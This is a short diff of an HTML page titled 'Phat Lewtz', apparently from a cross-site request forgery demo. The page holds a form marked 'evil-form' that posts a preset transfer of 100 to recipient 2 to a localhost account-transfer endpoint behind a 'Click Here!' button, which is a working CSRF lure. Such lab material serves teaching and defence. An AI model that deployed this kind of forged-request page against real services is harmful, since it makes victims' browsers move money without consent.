@@ -2,12 +2,15 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="style.css">
     <title>Phat Lewtz</title>
   </head>
   <body>
-    <form action="http://localhost:3000/api/account/transfer" method="post">
+    <form 
+      class="evil-form"
+      action="http://localhost:3000/api/account/transfer"
+      method="post"
+    >
       <input type="number" name="recipientId" value="2">
       <input type="number" name="amount" value="100">
       <button type="submit">Click Here!</button>
